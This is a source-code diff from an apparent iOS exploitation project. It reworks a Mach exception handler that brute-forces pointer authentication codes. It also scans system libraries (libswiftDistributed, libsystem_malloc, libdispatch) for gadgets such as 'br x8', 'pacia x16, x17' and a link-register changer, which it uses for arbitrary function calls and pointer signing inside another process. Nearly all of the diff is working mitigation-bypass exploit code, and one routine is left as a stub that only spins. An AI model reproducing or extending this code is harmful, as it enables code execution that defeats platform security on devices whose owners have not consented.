@@ -103,16 +103,15 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         if (signed_pointer != 0) {
             pacBruteForcedPtr = signed_pointer;
         }
-        __darwin_arm_thread_state64_set_lr_presigned_fptr(*new_state, (void *)0xFFFFFF00);
+        new_state->__lr = 0xFFFFFF00;
+        new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR;
+        new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR;
     }
     
-//     #define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR 0x2
-//     #define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
-//     #define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8
-    new_state->__flags &= ~0b1110; // clear some flags
+    new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC; // clear some flags
     
     uint32_t ptrL = (uint32_t)code[1];
-    uint32_t ptrR = (uint32_t)brX16Address;
+    uint32_t ptrR = (uint32_t)brX8Address;
     // code = {1, ptr} on iOS 16
     // code = {257, 0xFFFF...} on iOS 17
     if (exception == EXC_BAD_ACCESS && codeCnt == 2 &&
@@ -122,13 +121,13 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         if (signed_pointer == 0) {
             // Attempt to brute-force PAC
             // (pacFailedCount<<39) & ~0x0080000000000000: clear kernel pointer bit
-            pacBruteForcedPtr = ((uint64_t)brX16Address & 0xFFFFFFFFF) | ((pacFailedCount << 39) & ~0x0080000000000000);
+            pacBruteForcedPtr = ((uint64_t)brX8Address & 0xFFFFFFFFF) | ((pacFailedCount << 39) & ~0x0080000000000000);
         } else if (signed_pointer == pacBruteForcedPtr) {
             pacBruteForcedPtr = signed_pointer;
         }
         lastDiversifier = diversifier;
         
-        __darwin_arm_thread_state64_set_pc_presigned_fptr(*new_state, (void *)pacBruteForcedPtr);
+        new_state->__pc = pacBruteForcedPtr;
         pacFailedCount++;
         if ((pacFailedCount % 99999) == 0) {
             printf("Still brute forcing PAC... total: %llu\n", pacFailedCount);
@@ -137,7 +136,7 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         
         return KERN_SUCCESS;
     } else if (ptrL != ptrR) {
-        //printf("Unexpected exception code for EXC_BAD_ACCESS: code[0]=%llu code[1]=0x%016llx (expected 0x%016lx)\n", code[0], code[1]&0xFFFFFFFFF, brX16Address&0xFFFFFFFFF);
+        //printf("Unexpected exception code for EXC_BAD_ACCESS: code[0]=%llu code[1]=0x%016llx (expected 0x%016lx)\n", code[0], code[1]&0xFFFFFFFFF, brX8Address&0xFFFFFFFFF);
     }
     
     //printf("exception handler raise state - exception %d\n", exception);
@@ -150,7 +149,7 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
             printf("- ptr: 0x%016llx\n", pacBruteForcedPtr);
             printf("- div: 0x%08x\n", lastDiversifier);
         }
-        brX16Address = pacBruteForcedPtr;
+        brX8Address = pacBruteForcedPtr;
         NSUserDefaults.standardUserDefaults.signedPointer = signed_pointer = pacBruteForcedPtr;
         NSUserDefaults.standardUserDefaults.signedDiversifier = lastDiversifier;
     }
@@ -165,7 +164,7 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         }
     }
     
-    __darwin_arm_thread_state64_set_pc_fptr(*new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX16Address, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
+    __darwin_arm_thread_state64_set_pc_fptr(*new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX8Address, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
     //new_state->__x[16] = (uint64_t)ptrauth_strip(dlsym(RTLD_DEFAULT, "sleep"), ptrauth_key_function_pointer);
     dispatch_semaphore_wait(sem_input_ready, DISPATCH_TIME_FOREVER);
     
@@ -196,24 +195,46 @@ mach_port_t setup_exception_server(void) {
     sem_input_ready = dispatch_semaphore_create(0);
     sem_output_ready = dispatch_semaphore_create(0);
     
-    // find br x16
-    uint32_t *func = ((uint32_t *)ptrauth_strip((void *)fcntl, ptrauth_key_function_pointer));
-    for (; *func != 0xd61f0200; func++) {}
-    brX16Address = (uint64_t)ptrauth_sign_unauthenticated((void *)func, ptrauth_key_function_pointer, 0);
-    printf("Found br x16 at address: 0x%016lx\n", brX16Address);
+    // TODO: save offsets
     
-    // if br x16 != saved address, clear saved address
-    if (signed_pointer != 0 && (brX16Address&0xFFFFFFFFF) != (signed_pointer&0xFFFFFFFFF)) {
-        printf("br x16 address changed, clearing saved signed pointer\n");
+    // unauthenticated br x8 gadget
+    void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
+    assert(handle != NULL);
+    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "swift_distributed_execute_target");
+    assert(func != NULL);
+    for (; *func != 0xd61f0100; func++) {}
+    brX8Address = (uint64_t)func;
+    printf("Found br x8 at address: 0x%016lx\n", brX8Address);
+    // if br x8 != saved address, clear saved address
+    uint64_t savedPpointer = NSUserDefaults.standardUserDefaults.signedPointer;
+    if (savedPpointer != 0 && (brX8Address&0xFFFFFFFFF) != (savedPpointer&0xFFFFFFFFF)) {
+        printf("br x8 address changed, clearing saved signed pointer\n");
         NSUserDefaults.standardUserDefaults.signedPointer = 0;
+        NSUserDefaults.standardUserDefaults.signedDiversifier = 0;
     }
     
-    // find blr x19
-    uint64_t dyldBase = (uint64_t)_alt_dyld_get_all_image_infos()->dyldImageLoadAddress;
-    func = (uint32_t *)dyldBase;
-    for (; *func != 0xd63f0260; func++) {}
-    blrX19Offset = (uint64_t)func - dyldBase;
-    printf("Found blr x19 at offset: 0x%016lx\n", blrX19Offset);
+    // PAC signing gadget
+    func = (uint32_t *)zeroify_scalable_zone;
+    for (; func[0] != 0xdac10230 || func[1] != 0xf9000110; func++) {}
+    paciaAddress = (uint64_t)func;
+    printf("Found pacia x16, x17 at address: 0x%016lx\n", paciaAddress);
+    
+    // change LR gadget
+    func = (uint32_t *)dispatch_debug;
+    for (; func[0] != 0xaa0103fe || func[1] != 0xf9402008; func++) {}
+    changeLRAddress = (uint64_t)func;
+    
+    // blraaz gadget
+    // libxpc.dylib`xpc_create_from_ce_der_with_key:
+    // 0x1e6e487d4 <+0>:   pacibsp
+    // ...
+    // libxpc.dylib`_objectForActiveContext:
+    // 0x1e6e48b8c <+416>: blraaz x8
+    // libxpc.dylib`___lldb_unnamed_symbol2690:
+    // 0x1e6e48b90 <+0>:   udf    #0xc
+//    func = (uint32_t *)xpc_create_from_ce_der_with_key;
+//    for (; func[0] != 0xd63f091f || func[1] != 0x0000000c; func++) {}
+//    blraazX8Address = (uint64_t)func;
     
     printf("exception server starting\n");
     mach_port_t server_port;
@@ -246,12 +267,19 @@ uint64_t RemoteArbCallBLRInternal(char *name, uint64_t pc, uint64_t args[], int 
     //printf("Writing to stack at 0x%016llx\n", sp+0xa8);
     RemoteWrite64(sp + 0xa8, 0xFFFFFF00);
     new_state->__x[19] = pc;
-    assert(blrX19Address);
-    return RemoteArbCallInternal(name, blrX19Address, args, argCount);
+    
+    printf("TODO: IMPLEMENT THIS BACK!! spinning....\n");
+    sleep(1000);
+    //assert(blrX19Address);
+    //return RemoteArbCallInternal(name, blrX19Address, args, argCount);
+    assert(0);
 }
 
 os_unfair_lock funcLock = OS_UNFAIR_LOCK_INIT;
 uint64_t RemoteArbCallInternal(char *name, uint64_t pc, uint64_t args[], int argCount) {
+    // libswiftDistributed.dylib`swift_distributed_execute_target:
+    // 0x20d1f0e58 <+352>: br     x8
+    
     if (argCount > 8) {
         uint64_t sp = new_state->__sp; xpaci(sp);
         for (int i = 8; i < argCount; i++) {
@@ -261,7 +289,7 @@ uint64_t RemoteArbCallInternal(char *name, uint64_t pc, uint64_t args[], int arg
     }
     
     xpaci(pc);
-    new_state->__x[16] = pc;
+    new_state->__x[8] = pc;
     memcpy(&new_state->__x[0], args, argCount * sizeof(uint64_t));
     
     printf("Calling function %s\n", name);
@@ -270,6 +298,28 @@ uint64_t RemoteArbCallInternal(char *name, uint64_t pc, uint64_t args[], int arg
     
     printf("- function returned x0=0x%llx\n", new_state->__x[0]);
     return new_state->__x[0];
+}
+
+uint64_t RemoteSignPACIA(uint64_t address, uint64_t modifier) {
+    // libsystem_malloc.dylib`zeroify_scalable_zone:
+    // 0x1b7102610 <+60>: pacia  x16, x17
+    // 0x1b7102614 <+64>: str    x16, [x8, #0x10]
+    // we're using br x8 to branch to here, and when it attempts to store to [x8],
+    // it will crash and we can catch the exception to get the signed pointer
+    new_state->__x[16] = address;
+    new_state->__x[17] = modifier;
+    RemoteArbCallInternal("pacia", paciaAddress, (uint64_t[]){}, 0);
+    return new_state->__x[16];
+}
+
+void RemoteChangeLR(uint64_t newLR) {
+    // libdispatch.dylib`__dispatch_event_loop_cancel_waiter.cold.1:
+    // 0x18e527974 <+8>:  mov    x30, x1
+    // libdispatch.dylib`__dispatch_event_loop_cancel_waiter.cold.2:
+    // 0x18e527978 <+0>:  ldr    x8, [x0, #0x40]
+    
+    // x0=0 to cause a null deref to bring control back to us
+    RemoteArbCallInternal("change_lr", changeLRAddress, (uint64_t[]){0, newLR}, 2);
 }
 
 uint32_t RemoteRead32(uint64_t address) {
